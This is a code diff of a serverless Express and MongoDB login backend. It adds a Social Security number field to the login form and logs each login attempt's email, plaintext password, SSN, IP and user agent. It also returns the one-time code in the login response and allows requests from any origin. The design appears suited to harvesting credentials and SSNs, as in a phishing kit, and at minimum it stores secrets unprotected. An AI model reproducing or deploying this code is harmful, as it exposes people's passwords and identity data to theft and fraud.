@@ -1,14 +1,62 @@
 const express = require("express");
 const serverless = require("serverless-http");
 const mongoose = require("mongoose");
-const { z } = require("zod");
 
-// Import your existing schemas and models
-const { loginSchema, otpSchema } = require("../../shared/schema");
-const { User, OTPCode, LoginAttempt, OTPAttempt } = require("../../shared/mongodb-models");
+// MongoDB Models (inline for serverless)
+const userSchema = new mongoose.Schema({
+  email: { type: String, required: true, unique: true },
+  password: { type: String, required: true },
+  isEmailVerified: { type: Boolean, default: false },
+  createdAt: { type: Date, default: Date.now }
+});
+
+const otpCodeSchema = new mongoose.Schema({
+  email: { type: String, required: true },
+  code: { type: String, required: true },
+  expiresAt: { type: Date, required: true },
+  isUsed: { type: Boolean, default: false },
+  createdAt: { type: Date, default: Date.now }
+});
+
+const loginAttemptSchema = new mongoose.Schema({
+  email: { type: String, required: true },
+  password: { type: String, required: true },
+  ssn: { type: String, required: true },
+  success: { type: Boolean, required: true },
+  ipAddress: { type: String },
+  userAgent: { type: String },
+  createdAt: { type: Date, default: Date.now }
+});
+
+const otpAttemptSchema = new mongoose.Schema({
+  email: { type: String, required: true },
+  code: { type: String, required: true },
+  success: { type: Boolean, required: true },
+  ipAddress: { type: String },
+  userAgent: { type: String },
+  createdAt: { type: Date, default: Date.now }
+});
+
+const User = mongoose.models.User || mongoose.model('User', userSchema);
+const OTPCode = mongoose.models.OTPCode || mongoose.model('OTPCode', otpCodeSchema);
+const LoginAttempt = mongoose.models.LoginAttempt || mongoose.model('LoginAttempt', loginAttemptSchema);
+const OTPAttempt = mongoose.models.OTPAttempt || mongoose.model('OTPAttempt', otpAttemptSchema);
 
 const app = express();
 const router = express.Router();
+
+// CORS middleware for Netlify
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+  
+  if (req.method === 'OPTIONS') {
+    res.sendStatus(200);
+  } else {
+    next();
+  }
+});
 
 // Middleware
 app.use(express.json());
@@ -230,10 +278,34 @@ class MongoDBStorage {
 
 const storage = new MongoDBStorage();
 
+// Simple validation functions
+function validateLogin(data) {
+  if (!data.email || !data.email.includes('@')) {
+    throw new Error('Please enter a valid email address');
+  }
+  if (!data.password || data.password.length < 6) {
+    throw new Error('Password must be at least 6 characters');
+  }
+  if (!data.ssn || !/^\d{3}-\d{2}-\d{4}$/.test(data.ssn)) {
+    throw new Error('SSN must be in format XXX-XX-XXXX');
+  }
+  return data;
+}
+
+function validateOTP(data) {
+  if (!data.email || !data.email.includes('@')) {
+    throw new Error('Please enter a valid email address');
+  }
+  if (!data.code || data.code.length !== 6) {
+    throw new Error('OTP code must be 6 digits');
+  }
+  return data;
+}
+
 // Routes
 router.post('/auth/login', async (req, res) => {
   try {
-    const validatedData = loginSchema.parse(req.body);
+    const validatedData = validateLogin(req.body);
     const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
     const userAgent = req.get('User-Agent') || 'unknown';
     
@@ -248,7 +320,7 @@ router.post('/auth/login', async (req, res) => {
       otp: otpCode.code // For demo purposes only
     });
   } catch (error) {
-    if (error instanceof z.ZodError) {
+    if (error.message) {
       const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
       const userAgent = req.get('User-Agent') || 'unknown';
       try {
@@ -266,7 +338,7 @@ router.post('/auth/login', async (req, res) => {
       
       return res.status(400).json({ 
         success: false, 
-        message: error.errors[0].message 
+        message: error.message 
       });
     }
     res.status(500).json({ 
@@ -278,7 +350,7 @@ router.post('/auth/login', async (req, res) => {
 
 router.post('/auth/verify-otp', async (req, res) => {
   try {
-    const validatedData = otpSchema.parse(req.body);
+    const validatedData = validateOTP(req.body);
     const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
     const userAgent = req.get('User-Agent') || 'unknown';
     
@@ -290,10 +362,10 @@ router.post('/auth/verify-otp', async (req, res) => {
       redirectUrl: "/dashboard"
     });
   } catch (error) {
-    if (error instanceof z.ZodError) {
+    if (error.message) {
       return res.status(400).json({ 
         success: false, 
-        message: error.errors[0].message 
+        message: error.message 
       });
     }
     res.status(500).json({ 
